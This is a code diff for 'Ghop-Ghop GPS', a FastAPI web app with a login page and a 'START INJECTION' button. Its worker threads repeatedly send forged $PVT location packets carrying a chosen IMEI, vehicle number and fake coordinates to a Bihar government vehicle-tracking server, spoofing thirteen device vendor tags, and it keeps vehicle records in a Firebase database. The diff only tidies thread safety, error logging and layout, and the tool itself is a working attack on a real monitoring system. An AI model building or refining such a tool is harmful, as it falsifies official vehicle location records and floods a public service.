@@ -6,39 +6,42 @@ import httpx
 
 app = FastAPI()
 
-# --- 🚀 CONFIG & ATOMIC STATE ---
+# --- 🚀 CONFIG & THREAD-SAFE STATE ---
 DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
-firing = False
+stop_event = threading.Event() # 🛑 Thread-safe control
+stop_event.set() # Initially stopped
 total_sent = 0
 lock = threading.Lock() 
 TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
 
-# --- 🏎️ TURBO ENGINE (SERVER SYNC OPTIMIZED) ---
+# --- 🏎️ TURBO ENGINE (STRICT THREAD-SAFE) ---
 def handshake_worker(tag, imei, vno, lat, lon):
-    global firing, total_sent
-    while firing:
+    global total_sent
+    while not stop_event.is_set():
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) 
-            s.settimeout(5)
-            s.connect(("vlts.bihar.gov.in", 9999))
-            
-            while firing:
-                for _ in range(15):
-                    if not firing: break
-                    now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
-                    dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
-                    pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
-                    
-                    s.sendall(bytes(pkt, 'ascii'))
-                    with lock:
-                        total_sent += 1
-                    time.sleep(0.005) 
-                time.sleep(0.05) 
-        except:
-            try: s.close()
-            except: pass
-            time.sleep(0.5) 
+            # Safe Socket Management
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) 
+                s.settimeout(5)
+                s.connect(("vlts.bihar.gov.in", 9999))
+                
+                while not stop_event.is_set():
+                    # Batch Burst
+                    for _ in range(15):
+                        if stop_event.is_set(): break
+                        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
+                        dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
+                        pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
+                        
+                        s.sendall(bytes(pkt, 'ascii'))
+                        with lock:
+                            total_sent += 1
+                        time.sleep(0.005) 
+                    time.sleep(0.05) 
+        except Exception as e:
+            # Proper error logging for debugging
+            print(f"Worker Error [{tag}]: {e}")
+            time.sleep(1) 
 
 @app.get("/fetch_data")
 async def fetch_data(vno: str):
@@ -48,33 +51,37 @@ async def fetch_data(vno: str):
             r = await client.get(f"{DB_URL}/Data_Records/{v_up}.json")
             data = r.json()
             if data: return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
-        except: pass
+        except Exception as e: print(f"DB Fetch Error: {e}")
     return {"found": False}
 
 @app.get("/init")
 async def init(v:str, i:str, lt:str, ln:str, background_tasks: BackgroundTasks):
-    global firing, total_sent
-    if not firing:
+    global total_sent
+    if stop_event.is_set():
         v_up = v.upper().strip()
-        firing, total_sent = True, 0
+        total_sent = 0
+        stop_event.clear() # Start firing
+        
         now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
         payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active", "Start": now_ist.strftime('%H:%M:%S')}
         background_tasks.add_task(update_db_records, v_up, payload)
+        
         for tag in TAGS:
             threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
     return {"ok": True}
 
 async def update_db_records(vno, payload):
     async with httpx.AsyncClient() as client:
-        await client.put(f"{DB_URL}/Data_Records/{vno}.json", json=payload)
+        try: await client.put(f"{DB_URL}/Data_Records/{vno}.json", json=payload)
+        except Exception as e: print(f"DB Update Error: {e}")
 
 @app.get("/status")
-def status(): return {"c": total_sent, "f": firing}
+def status(): return {"c": total_sent, "f": not stop_event.is_set()}
 
 @app.get("/stop")
-def stop(): global firing; firing = False; return {"ok": True}
+def stop(): stop_event.set(); return {"ok": True}
 
-# --- 🎨 FINAL UI (FIXED ALIGNMENT + MOBILE OPTIMIZED) ---
+# --- 🎨 FINAL UI (MOBILE OPTIMIZED + REFRESH BUG FIX) ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
@@ -97,11 +104,7 @@ async def home():
         .wall-msg { color:red; font-weight:bold; }
         #map { width:100%; height:250px; margin-top:15px; border:1px solid #0f0; border-radius:10px; background:#111; }
         .nav { width:95%; max-width:440px; display:flex; justify-content:space-between; font-size:12px; margin-top:10px; color:#fff; }
-        
-        /* Fixed Alignment for Checkboxes */
         .chk-group { display:flex; align-items:center; justify-content:center; gap:10px; margin-top:15px; font-size:13px; width:100%; }
-        .chk-group input[type="checkbox"] { width:20px; height:20px; margin:0; cursor:pointer; }
-        
         #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2000; justify-content:center; align-items:center; }
         .popup { width:90%; max-width:350px; border:2px solid #ff0; padding:20px; background:#111; color:#fff; text-align:center; border-radius:15px; box-shadow: 0 0 30px #ff0; box-sizing: border-box; }
     </style></head><body>
@@ -112,12 +115,7 @@ async def home():
         <h1 style="text-align:center;font-size:24px;letter-spacing:5px;">Ghop-Ghop GPS</h1>
         <input type="text" id="m_num" placeholder="MOBILE NUMBER">
         <input type="password" id="m_pass" placeholder="PASSWORD">
-        
-        <div class="chk-group">
-            <input type="checkbox" id="rem"> 
-            <label for="rem">Remember Me</label>
-        </div>
-        
+        <div class="chk-group"><input type="checkbox" id="rem"> <label for="rem">Remember Me</label></div>
         <button onclick="login()" style="background:#0f0;color:#000;border:none;margin-top:20px;">ACCESS SYSTEM</button>
     </div>
 
@@ -130,12 +128,7 @@ async def home():
         <div class="user-wall" id="u_wall"></div>
         <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
         <input type="text" id="i" placeholder="IMEI">
-        
-        <div class="chk-group">
-            <input type="checkbox" id="useDef" checked> 
-            <label for="useDef">Use Default Location (Profile)</label>
-        </div>
-        
+        <div class="chk-group"><input type="checkbox" id="useDef" checked> <label for="useDef">Use Default Location (Profile)</label></div>
         <div style="display:flex;gap:5px;margin-top:10px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
         <button onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
         <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;border:none;">START INJECTION</button>
@@ -150,7 +143,7 @@ async def home():
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";
-        let map, marker, curUser = null, currentBCID = "", mon;
+        let map, marker, curUser = null, currentBCID = "", mon = null;
 
         function initMap() {
             if (map) return;
@@ -209,10 +202,12 @@ async def home():
                 const lat = p.coords.latitude.toFixed(6), lon = p.coords.longitude.toFixed(6);
                 document.getElementById('lt').value = lat; document.getElementById('ln').value = lon;
                 map.setView([lat, lon], 14); marker.setLatLng([lat, lon]);
-            }, (e) => alert("Allow location access in settings."), {enableHighAccuracy:true});
+            }, (e) => alert("Allow location access."), {enableHighAccuracy:true});
         }
 
         function st() {
+            // FIX: Clear existing interval before starting new one
+            if(mon) clearInterval(mon);
             let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value;
             fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}`);
             document.getElementById('st_text').innerText="FIRING";
@@ -220,7 +215,7 @@ async def home():
         }
 
         async function sp() {
-            fetch('/stop'); clearInterval(mon);
+            fetch('/stop'); if(mon) clearInterval(mon); mon = null;
             let total = document.getElementById('c').innerText, v_no = document.getElementById('v').value.toUpperCase().trim();
             if(parseInt(total)>0 && v_no !== ""){
                 let ist = new Date(new Date().getTime() + (5.5 * 60 * 60 * 1000));
